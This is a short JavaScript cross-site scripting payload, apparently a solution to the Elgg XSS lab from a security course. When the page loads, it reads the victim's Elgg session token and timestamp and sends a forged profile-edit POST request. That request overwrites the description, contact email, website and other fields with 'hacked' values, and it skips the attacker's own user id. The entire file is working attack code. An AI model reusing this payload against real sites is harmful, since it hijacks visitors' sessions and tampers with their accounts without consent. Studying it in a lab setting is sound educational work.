<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	        var token="&__elgg_token="+elgg.security.token.__elgg_token;

		// Have to set each field which will be sent in the post request
		// found the params in the params field of the inspector
		// tried to set the value the same way as shown above
		// found what number represented which access level by sending edit request
	


		var description = "&description=1605038";
		var accessdescription = "&accesslevel[description]=1";

                var bdescription = "&briefdescription=Hacked";
 		var accessbdescription = "&accesslevel[briefdescription]=1";

		var contactemail = "&contactemail=hacker@gmail.com";
		var accessemail = "&accesslevel[contactemail]=1";

		var location = "&location=World";
		var accesslocation = "&accesslevel[location]=1";

		var mobile = "&mobile=hacked";
		var accessmobile = "&accesslevel[mobile]=1";

		var phone = "&phone=hacked";
		var accessphone = "&accesslevel[phone]=1";

		var website = "&website=http://www.hacker.com";
		var accesswebsite = "&accesslevel[website]=1";

		var skills = "&skills=hacker";
		var accessskills = "&accesslevel[skills]=1";

		var twitter = "&twitter=hacker";
		var accesstwitter = "&accesslevel[twitter]=1";

		var interests = "&interests=hacking";
		var accessinterests = "&accesslevel[interests]=1";

               
                var guid = "&guid=" + elgg.session.user.guid;

		
		var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN

		//Construct the content of your url.
		// concatenate all the key value pairs as the content of our request 
		// send post request with ajax
		// we'll be sending text to our server with our form data formatted in key-value pairs

		var content= ts + token + description + accessdescription + bdescription + accessbdescription + contactemail + accessemail + location + accesslocation   + mobile  + accessmobile + phone + accessphone + skills + accessskills + website + accesswebsite + twitter + accesstwitter + interests + accessinterests +   guid; //FILL IN
	
		 if(elgg.session.user.guid !== 47)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
		
       
	}
</script>
